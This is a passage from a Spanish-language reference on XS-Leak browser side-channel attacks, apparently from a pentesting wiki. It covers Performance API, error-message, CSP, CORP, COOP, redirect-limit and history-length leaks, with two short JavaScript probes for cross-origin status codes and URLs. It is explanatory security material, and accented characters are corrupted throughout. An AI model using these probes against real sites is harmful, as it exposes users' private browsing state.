* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Es posible **diferenciar entre c贸digos de estado de respuesta HTTP** porque las solicitudes que generan un **error** no crean una entrada de rendimiento.

### Error de Recarga de Estilo

* **M茅todos de Inclusi贸n**: Elementos HTML
* **Diferencia Detectable**: C贸digo de Estado
* **M谩s informaci贸n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumen:** Debido a un error del navegador, las solicitudes que resultan en errores se cargan dos veces.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

En la t茅cnica anterior tambi茅n se identificaron dos casos en los que errores en GC llevan a que los **recursos se carguen dos veces cuando no se cargan correctamente**. Esto resultar谩 en m煤ltiples entradas en la API de Rendimiento y, por lo tanto, puede ser detectado.

### Error de Fusi贸n de Solicitudes

* **M茅todos de Inclusi贸n**: Elementos HTML
* **Diferencia Detectable**: C贸digo de Estado
* **M谩s informaci贸n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumen:** Las solicitudes que resultan en un error no pueden fusionarse.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

La t茅cnica se encontr贸 en una tabla en el documento mencionado, pero no se encontr贸 una descripci贸n de la t茅cnica en 茅l. Sin embargo, se puede encontrar el c贸digo fuente que lo verifica en [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Fuga de P谩gina Vac铆a

* **M茅todos de Inclusi贸n**: Marcos
* **Diferencia Detectable**: Contenido de la P谩gina
* **M谩s informaci贸n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumen:** Las respuestas vac铆as no crean entradas de temporizaci贸n de recursos.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Un atacante puede detectar si una solicitud result贸 en un cuerpo de respuesta HTTP vac铆o porque las **p谩ginas vac铆as no crean una entrada de rendimiento en algunos navegadores**.

### **Fuga de XSS-Auditor**

* **M茅todos de Inclusi贸n**: Marcos
* **Diferencia Detectable**: Contenido de la P谩gina
* **M谩s informaci贸n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumen:** Utilizando el Auditor XSS en Afirmaciones de Seguridad, los atacantes pueden detectar elementos espec铆ficos de la p谩gina web observando alteraciones en las respuestas cuando los payloads elaborados activan el mecanismo de filtrado del auditor.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

En Afirmaciones de Seguridad (SA), el Auditor XSS, originalmente destinado a prevenir ataques de Cross-Site Scripting (XSS), puede ser explotado parad贸jicamente para filtrar informaci贸n sensible. Aunque esta funci贸n integrada fue eliminada de Google Chrome (GC), todav铆a est谩 presente en SA. En 2013, Braun y Heiderich demostraron que el Auditor XSS podr铆a bloquear inadvertidamente scripts leg铆timos, lo que lleva a falsos positivos. Bas谩ndose en esto, los investigadores desarrollaron t茅cnicas para extraer informaci贸n y detectar contenido espec铆fico en p谩ginas de origen cruzado, un concepto conocido como XS-Leaks, reportado inicialmente por Terada y elaborado por Heyes en una publicaci贸n de blog. Aunque estas t茅cnicas eran espec铆ficas del Auditor XSS en GC, se descubri贸 que en SA, las p谩ginas bloqueadas por el Auditor XSS no generan entradas en la API de Rendimiento, revelando un m茅todo a trav茅s del cual a煤n se podr铆a filtrar informaci贸n sensible.

### Fuga de X-Frame

* **M茅todos de Inclusi贸n**: Marcos
* **Diferencia Detectable**: Encabezado
* **M谩s informaci贸n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Resumen:** Un recurso con el encabezado X-Frame-Options no crea una entrada de temporizaci贸n de recursos.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Si una p谩gina **no est谩 permitida** para ser **renderizada** en un **iframe**, no crea una entrada de rendimiento. Como resultado, un atacante puede detectar el encabezado de respuesta **`X-Frame-Options`**.\
Lo mismo sucede si se utiliza una **etiqueta embed**.

### Detecci贸n de Descargas

* **M茅todos de Inclusi贸n**: Marcos
* **Diferencia Detectable**: Encabezado
* **M谩s informaci贸n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumen:** Las descargas no crean entradas de temporizaci贸n de recursos en la API de Rendimiento.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Similar al XS-Leak descrito, un **recurso que se descarga** debido al encabezado ContentDisposition, tampoco crea una entrada de rendimiento. Esta t茅cnica funciona en todos los navegadores principales.
### Inicio de Redirecci贸n de Fuga

* **M茅todos de Inclusi贸n**: Marcos
* **Diferencia Detectable**: Redirecci贸n
* **M谩s informaci贸n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumen:** La entrada de temporizaci贸n de recursos filtra el tiempo de inicio de una redirecci贸n.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Encontramos una instancia de XS-Leak que abusa del comportamiento de algunos navegadores que registran demasiada informaci贸n para solicitudes entre or铆genes. El est谩ndar define un subconjunto de atributos que deber铆an establecerse en cero para recursos entre or铆genes. Sin embargo, en **SA** es posible detectar si el usuario es **redirigido** por la p谩gina de destino, consultando la **API de Rendimiento** y verificando los datos de temporizaci贸n de **redirectStart**.

### Duraci贸n de Fuga de Redirecci贸n

* **M茅todos de Inclusi贸n**: API Fetch
* **Diferencia Detectable**: Redirecci贸n
* **M谩s informaci贸n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumen:** La duraci贸n de las entradas de temporizaci贸n es negativa cuando ocurre una redirecci贸n.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

En GC, la **duraci贸n** de las solicitudes que resultan en una **redirecci贸n** es **negativa** y, por lo tanto, se puede **distinguir** de las solicitudes que no resultan en una redirecci贸n.

### Fuga de CORP

* **M茅todos de Inclusi贸n**: Marcos
* **Diferencia Detectable**: Encabezado
* **M谩s informaci贸n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumen:** Los recursos protegidos con CORP no crean entradas de temporizaci贸n de recursos.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

En algunos casos, la entrada **nextHopProtocol** se puede utilizar como t茅cnica de fuga. En GC, cuando se establece el **encabezado CORP**, el nextHopProtocol estar谩 **vac铆o**. Tenga en cuenta que SA no crear谩 una entrada de rendimiento en absoluto para recursos habilitados para CORP.

### Trabajador de Servicio

* **M茅todos de Inclusi贸n**: Marcos
* **Diferencia Detectable**: Uso de API
* **M谩s informaci贸n**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Resumen:** Detecta si un trabajador de servicio est谩 registrado para un origen espec铆fico.
* **Ejemplo de C贸digo**:

Los trabajadores de servicio son contextos de secuencia de comandos basados en eventos que se ejecutan en un origen. Se ejecutan en segundo plano de una p谩gina web y pueden interceptar, modificar y **almacenar en cach茅 recursos** para crear aplicaciones web sin conexi贸n.\
Si un **recurso almacenado en cach茅** por un **trabajador de servicio** se accede a trav茅s de un **iframe**, el recurso se **cargar谩 desde la cach茅 del trabajador de servicio**.\
Para detectar si el recurso se **carg贸 desde la cach茅 del trabajador de servicio**, se puede utilizar la **API de Rendimiento**.\
Esto tambi茅n se puede hacer con un ataque de temporizaci贸n (consulte el documento para obtener m谩s informaci贸n).

### Cach茅

* **M茅todos de Inclusi贸n**: API Fetch
* **Diferencia Detectable**: Temporizaci贸n
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Resumen:** Es posible verificar si un recurso se almacen贸 en la cach茅.
* **Ejemplo de C贸digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Usando la [API de Rendimiento](xs-search.md#performance-api) es posible verificar si un recurso est谩 en cach茅.

### Duraci贸n de Red de Fuga

* **M茅todos de Inclusi贸n**: API Fetch
* **Diferencia Detectable**: Contenido de la P谩gina
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Resumen:** Es posible recuperar la duraci贸n de la red de una solicitud desde la API `performance`.
* **Ejemplo de C贸digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## T茅cnica de Mensajes de Error

### Error de Medios

* **M茅todos de Inclusi贸n**: Elementos HTML (Video, Audio)
* **Diferencia Detectable**: C贸digo de Estado
* **M谩s informaci贸n**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Resumen:** En Firefox es posible filtrar con precisi贸n el c贸digo de estado de una solicitud entre or铆genes.
* **Ejemplo de C贸digo**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
### Error de CORS

* **M茅todos de Inclusi贸n**: Fetch API
* **Diferencia Detectable**: Encabezado
* **M谩s informaci贸n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumen:** En Afirmaciones de Seguridad (SA), los mensajes de error de CORS exponen inadvertidamente la URL completa de las solicitudes redirigidas.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Esta t茅cnica permite a un atacante **extraer el destino de la redirecci贸n de un sitio de origen cruzado** explotando c贸mo los navegadores basados en Webkit manejan las solicitudes CORS. Espec铆ficamente, cuando se env铆a una solicitud **habilitada para CORS** a un sitio objetivo que emite una redirecci贸n basada en el estado del usuario y el navegador posteriormente niega la solicitud, la **URL completa del destino de la redirecci贸n** se revela dentro del mensaje de error. Esta vulnerabilidad no solo revela el hecho de la redirecci贸n, sino que tambi茅n expone el punto final de la redirecci贸n y cualquier **par谩metro de consulta sensible** que pueda contener.

### Error de SRI

* **M茅todos de Inclusi贸n**: Fetch API
* **Diferencia Detectable**: Encabezado
* **M谩s informaci贸n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumen:** En Afirmaciones de Seguridad (SA), los mensajes de error de CORS exponen inadvertidamente la URL completa de las solicitudes redirigidas.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Un atacante puede explotar los **mensajes de error detallados** para deducir el tama帽o de las respuestas de origen cruzado. Esto es posible debido al mecanismo de Integridad de Subrecursos (SRI), que utiliza el atributo de integridad para validar que los recursos recuperados, a menudo de CDNs, no hayan sido manipulados. Para que SRI funcione en recursos de origen cruzado, estos deben estar **habilitados para CORS**; de lo contrario, no est谩n sujetos a comprobaciones de integridad. En Afirmaciones de Seguridad (SA), al igual que el error de CORS XS-Leak, un mensaje de error puede ser capturado despu茅s de que falle una solicitud fetch con un atributo de integridad. Los atacantes pueden **provocar deliberadamente este error** asignando un **valor de hash falso** al atributo de integridad de cualquier solicitud. En SA, el mensaje de error resultante revela inadvertidamente la longitud del contenido del recurso solicitado. Esta fuga de informaci贸n permite a un atacante discernir variaciones en el tama帽o de la respuesta, allanando el camino para ataques sofisticados de XS-Leak.

### Violaci贸n/Detecci贸n de CSP

* **M茅todos de Inclusi贸n**: Pop-ups
* **Diferencia Detectable**: C贸digo de Estado
* **M谩s informaci贸n**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Resumen:** Al permitir solo el sitio de la v铆ctima en la CSP, si intentamos acceder y se redirige a un dominio diferente, la CSP desencadenar谩 un error detectable.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Un XS-Leak puede usar la CSP para detectar si un sitio de origen cruzado fue redirigido a un origen diferente. Esta fuga puede detectar la redirecci贸n, pero adem谩s, se filtra el dominio del destino de la redirecci贸n. La idea b谩sica de este ataque es **permitir el dominio objetivo en el sitio del atacante**. Una vez que se emite una solicitud al dominio objetivo, este se **redirige** a un dominio de origen cruzado. La **CSP bloquea** el acceso a 茅l y crea un **informe de violaci贸n utilizado como t茅cnica de fuga**. Dependiendo del navegador, **este informe puede filtrar la ubicaci贸n objetivo de la redirecci贸n**.\
Los navegadores modernos no indicar谩n la URL a la que se redirigi贸, pero a煤n se puede detectar que se activ贸 una redirecci贸n de origen cruzado.

### Cach茅

* **M茅todos de Inclusi贸n**: Marcos, Pop-ups
* **Diferencia Detectable**: Contenido de la P谩gina
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Resumen:** Borra el archivo de la cach茅. Abre la p谩gina objetivo, verifica si el archivo est谩 presente en la cach茅.
* **Ejemplo de C贸digo:**

Los navegadores pueden usar una cach茅 compartida para todos los sitios web. Independientemente de su origen, es posible deducir si una p谩gina objetivo ha **solicitado un archivo espec铆fico**.

Si una p谩gina carga una imagen solo si el usuario ha iniciado sesi贸n, puedes **invalidar** el **recurso** (para que ya no est茅 en cach茅 si lo estaba, ver m谩s informaci贸n enlaces), **realizar una solicitud** que podr铆a cargar ese recurso e intentar cargar el recurso **con una solicitud incorrecta** (por ejemplo, usando un encabezado de referente demasiado largo). Si la carga del recurso **no desencadena ning煤n error**, es porque estaba **en cach茅**.

### Directiva CSP

* **M茅todos de Inclusi贸n**: Marcos
* **Diferencia Detectable**: Encabezado
* **M谩s informaci贸n**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Resumen:** Las directivas de encabezado CSP pueden ser sondeadas utilizando el atributo de iframe CSP, revelando detalles de la pol铆tica.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Una caracter铆stica novedosa en Google Chrome (GC) permite a las p谩ginas web **proponer una Pol铆tica de Seguridad de Contenido (CSP)** configurando un atributo en un elemento iframe, con directivas de pol铆tica transmitidas junto con la solicitud HTTP. Normalmente, el contenido incrustado debe **autorizar esto a trav茅s de un encabezado HTTP**, o se muestra una **p谩gina de error**. Sin embargo, si el iframe ya est谩 gobernado por una CSP y la pol铆tica reci茅n propuesta no es m谩s restrictiva, la p谩gina se cargar谩 normalmente. Este mecanismo abre un camino para que un atacante **detecte directivas CSP espec铆ficas** de una p谩gina de origen cruzado identificando la p谩gina de error. Aunque esta vulnerabilidad se marc贸 como solucionada, nuestros hallazgos revelan una **nueva t茅cnica de fuga** capaz de detectar la p谩gina de error, lo que sugiere que el problema subyacente nunca se abord贸 completamente.

### **CORP**

* **M茅todos de Inclusi贸n**: Fetch API
* **Diferencia Detectable**: Encabezado
* **M谩s informaci贸n**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Resumen:** Los recursos asegurados con Cross-Origin Resource Policy (CORP) lanzar谩n un error al ser recuperados desde un origen no permitido.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

El encabezado CORP es una caracter铆stica de seguridad de plataforma web relativamente nueva que cuando se establece **bloquea las solicitudes de origen cruzado no-cors al recurso dado**. La presencia del encabezado puede ser detectada, porque un recurso protegido con CORP lanzar谩 un error al ser recuperado.
### CORB

* **M茅todos de Inclusi贸n**: Elementos HTML
* **Diferencia Detectable**: Encabezados
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Resumen**: CORB puede permitir a los atacantes detectar cu谩ndo est谩 presente el encabezado **`nosniff`** en la solicitud.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Consulta el enlace para obtener m谩s informaci贸n sobre el ataque.

### Error CORS en la mala configuraci贸n de Reflexi贸n de Origen <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **M茅todos de Inclusi贸n**: API Fetch
* **Diferencia Detectable**: Encabezados
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Resumen**: Si el encabezado de Origen se refleja en el encabezado `Access-Control-Allow-Origin`, es posible verificar si un recurso ya est谩 en la cach茅.
* **Ejemplo de C贸digo**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

En caso de que el **encabezado de Origen** se est茅 **reflejando** en el encabezado `Access-Control-Allow-Origin`, un atacante puede abusar de este comportamiento para intentar **obtener** el **recurso** en modo **CORS**. Si no se produce un **error**, significa que se **recuper贸 correctamente del sitio web**; si se produce un **error**, es porque se **accedi贸 desde la cach茅** (el error aparece porque la cach茅 guarda una respuesta con un encabezado CORS que permite el dominio original y no el del atacante).\
Ten en cuenta que si el origen no se refleja pero se utiliza un comod铆n (`Access-Control-Allow-Origin: *`), esto no funcionar谩.

## T茅cnica de Atributos Legibles

### Redirecci贸n Fetch

* **M茅todos de Inclusi贸n**: API Fetch
* **Diferencia Detectable**: C贸digo de Estado
* **M谩s informaci贸n**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Resumen:** GC y SA permiten verificar el tipo de respuesta (redirecci贸n opaca) despu茅s de que se haya completado la redirecci贸n.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Al enviar una solicitud utilizando la API Fetch con `redirect: "manual"` y otros par谩metros, es posible leer el atributo `response.type` y si es igual a `opaqueredirect`, entonces la respuesta fue una redirecci贸n.

### COOP

* **M茅todos de Inclusi贸n**: Pop-ups
* **Diferencia Detectable**: Encabezado
* **M谩s informaci贸n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Resumen:** Las p谩ginas protegidas por la Pol铆tica de Apertura entre Or铆genes (COOP) evitan el acceso desde interacciones entre or铆genes.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Un atacante es capaz de deducir la presencia del encabezado de Pol铆tica de Apertura entre Or铆genes (COOP) en una respuesta HTTP entre or铆genes. COOP es utilizada por aplicaciones web para evitar que sitios externos obtengan referencias de ventana arbitrarias. La visibilidad de este encabezado se puede discernir intentando acceder a la **referencia contentWindow**. En escenarios donde COOP se aplica condicionalmente, la propiedad **`opener`** se convierte en un indicador revelador: es **indefinida** cuando COOP est谩 activa, y **definida** en su ausencia.

### Longitud M谩xima de URL - Lado del Servidor

* **M茅todos de Inclusi贸n**: API Fetch, Elementos HTML
* **Diferencia Detectable**: C贸digo de Estado / Contenido
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Resumen:** Detectar diferencias en las respuestas debido a que la longitud de la respuesta de redirecci贸n podr铆a ser demasiado grande y el servidor responde con un error, generando una alerta.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Si una redirecci贸n del lado del servidor utiliza **entrada de usuario dentro de la redirecci贸n** y **datos adicionales**, es posible detectar este comportamiento porque generalmente los **servidores** tienen un **l铆mite de longitud de solicitud**. Si los **datos del usuario** tienen esa **longitud - 1**, porque la **redirecci贸n** est谩 utilizando **esos datos** y **agregando** algo **extra**, se generar谩 un **error detectable a trav茅s de Eventos de Error**.

Si de alguna manera puedes establecer cookies a un usuario, tambi茅n puedes realizar este ataque al **establecer suficientes cookies** ([**bomba de cookies**](hacking-with-cookies/cookie-bomb.md)) para que con el **tama帽o de respuesta aumentado** de la **respuesta correcta** se genere un **error**. En este caso, recuerda que si activas esta solicitud desde un mismo sitio, `<script>` enviar谩 autom谩ticamente las cookies (as铆 que puedes verificar los errores).\
Un ejemplo de **bomba de cookies + XS-Search** se puede encontrar en la soluci贸n prevista de este informe: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` o estar en el mismo contexto generalmente es necesario para este tipo de ataque.

### Longitud M谩xima de URL - Lado del Cliente

* **M茅todos de Inclusi贸n**: Pop-ups
* **Diferencia Detectable**: C贸digo de Estado / Contenido
* **M谩s informaci贸n**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Resumen:** Detectar diferencias en las respuestas debido a que la longitud de la respuesta de redirecci贸n podr铆a ser demasiado grande para una solicitud, de modo que se pueda notar una diferencia.
* **Ejemplo de C贸digo**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Seg煤n la [documentaci贸n de Chromium](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), la longitud m谩xima de URL de Chrome es de 2MB.

> En general, la _plataforma web_ no tiene l铆mites en la longitud de las URL (aunque 2^31 es un l铆mite com煤n). _Chrome_ limita las URL a una longitud m谩xima de **2MB** por razones pr谩cticas y para evitar problemas de denegaci贸n de servicio en la comunicaci贸n entre procesos.

Por lo tanto, si la **URL de redirecci贸n respondida es m谩s grande en uno de los casos**, es posible hacer que redirija con una **URL mayor a 2MB** para alcanzar el **l铆mite de longitud**. Cuando esto sucede, Chrome muestra una p谩gina de **`about:blank#blocked`**.

La **diferencia notable** es que si la **redirecci贸n** se **complet贸**, `window.origin` arroja un **error** porque un origen cruzado no puede acceder a esa informaci贸n. Sin embargo, si se alcanz贸 el **l铆mite** y la p谩gina cargada fue **`about:blank#blocked`**, el **`origin`** de la ventana sigue siendo el del **padre**, que es una **informaci贸n accesible**.

Toda la informaci贸n adicional necesaria para alcanzar los **2MB** se puede agregar a trav茅s de un **hash** en la URL inicial para que se **utilice en la redirecci贸n**.

{% content-ref url="xs-search/url-max-length-client-side.md" %}
[url-max-length-client-side.md](xs-search/url-max-length-client-side.md)
{% endcontent-ref %}
### M谩ximo de Redirecciones

* **M茅todos de Inclusi贸n**: Fetch API, Frames
* **Diferencia Detectable**: C贸digo de Estado
* **M谩s informaci贸n**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Resumen:** Utilizar el l铆mite de redirecciones del navegador para verificar la ocurrencia de redirecciones de URL.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Si el **m谩ximo** n煤mero de **redirecciones** que puede seguir un navegador es **20**, un atacante podr铆a intentar cargar su p谩gina con **19 redirecciones** y finalmente **enviar a la v铆ctima** a la p谩gina probada. Si se desencadena un **error**, entonces la p谩gina estaba intentando **redirigir a la v铆ctima**.

### Longitud del Historial

* **M茅todos de Inclusi贸n**: Frames, Pop-ups
* **Diferencia Detectable**: Redirecciones
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Resumen:** El c贸digo JavaScript manipula el historial del navegador y puede ser accedido mediante la propiedad length.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

La **API de Historial** permite que el c贸digo JavaScript manipule el historial del navegador, el cual **guarda las p谩ginas visitadas por un usuario**. Un atacante puede usar la propiedad length como m茅todo de inclusi贸n: para detectar la navegaci贸n JavaScript y HTML.\
Al **verificar `history.length`**, haciendo que un usuario **navegue** a una p谩gina, **cambiarla** de nuevo al mismo origen y **verificar** el nuevo valor de **`history.length`**.

### Longitud del Historial con la misma URL

* **M茅todos de Inclusi贸n**: Frames, Pop-ups
* **Diferencia Detectable**: Si la URL es la misma que la supuesta
* **Resumen:** Es posible adivinar si la ubicaci贸n de un marco/ventana emergente est谩 en una URL espec铆fica abusando de la longitud del historial.
* **Ejemplo de C贸digo**: A continuaci贸n

Un atacante podr铆a usar c贸digo JavaScript para **manipular la ubicaci贸n del marco/ventana emergente a una supuesta** y **cambiarla inmediatamente a `about:blank`**. Si la longitud del historial aumentaba, significaba que la URL era correcta y hab铆a tenido tiempo de **aumentar porque la URL no se recarga si es la misma**. Si no aumentaba, significaba que **intent贸 cargar la URL supuesta** pero como **inmediatamente despu茅s** cargamos **`about:blank`**, la **longitud del historial nunca aument贸** al cargar la URL supuesta.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Conteo de Frames

* **M茅todos de Inclusi贸n**: Frames, Pop-ups
* **Diferencia Detectable**: Contenido de la P谩gina
